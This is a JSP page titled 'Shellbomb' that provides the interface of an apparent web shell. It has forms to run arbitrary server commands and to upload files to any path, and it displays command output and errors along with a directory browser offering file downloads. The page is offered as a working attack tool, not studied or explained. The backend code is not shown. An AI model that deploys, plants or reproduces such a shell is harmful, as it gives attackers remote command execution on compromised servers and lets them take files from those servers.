<%@ taglib prefix="c"
           uri="http://java.sun.com/jsp/jstl/core" %>

<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
	pageEncoding="ISO-8859-1"%>

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<link>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<script src="${context}/res/js/bootstrap.min.js"></script>
<link rel="stylesheet" href="${context}/res/css/bootstrap.min.css"/>
<link rel="stylesheet" href="${context}/res/css/bootstrap-theme.min.css"/>

<title>Shellbomb</title>
</head>
<body>
<nav class="navbar navbar-inverse navbar-fixed-top">
    <div class="container">
        <div class="navbar-header">

            <a class="navbar-brand" href="#">Shellbomb!</a>
        </div>

    </div>
</nav>

<div class="container">

    <div class="starter-template">
        <section>
            <form action="${context}/command" enctype="application/x-www-form-urlencoded"
                  name="commandForm" method="POST">
                <h3>Execute command</h3>
                Enter command to execute <br/>
                <input type="text" name="cmd" required />
                <input type="submit" />
            </form>

        </section>
        <section>
            <form action="${context}/upload" enctype="multipart/form-data" name="uploadForm" method="POST">
                <h3>Upload file</h3>
                Select file to upload <br/>
                <input type="file" name="file" required />
                <br/>
                Path to upload file <br/>
                <input name="filePath" type="text" required />
                <br/>
                <input type="submit" />
            </form>
        </section>
        <section>
            <c:if test="${not empty commandOutput}">
                <h3>Last command output </h3>
                <pre>
                        ${commandOutput}
                </pre>
            </c:if>

            <c:if test="${not empty commandError}">
                <h3>Last command error </h3>
                <pre>
                        ${commandError}
                </pre>
            </c:if>
        </section>

        <c:if test="${not empty ls}">
            <div>
                <h3>Current dir: ${currentDir}</h3>
                <table class="table">
                <c:forEach items="${ls}" var="file">
                    <tbody>
                    <tr>
                        <td>
                            <c:choose>
                                <c:when test="${file.type == 'directory'}">
                                    <a href="?path=${file.fullPath}">${file.name}</a>
                                </c:when>
                                <c:otherwise>
                                    ${file.name}
                                </c:otherwise>
                            </c:choose>

                        </td>
                        <td> ${file.type}</td>
                        <td> ${file.size}</td>

                        <td>
                            <c:if test="${file.type != 'directory'}">
                                <span><a href="${file.downloadLink}">Download </a>
                                </span>
                            </c:if>
                            &nbsp;
                        </td>

                    </tr>
                    </tbody>
                </c:forEach>
                </table>
            </div>
        </c:if>
    </div>

</div>

</body>
</html>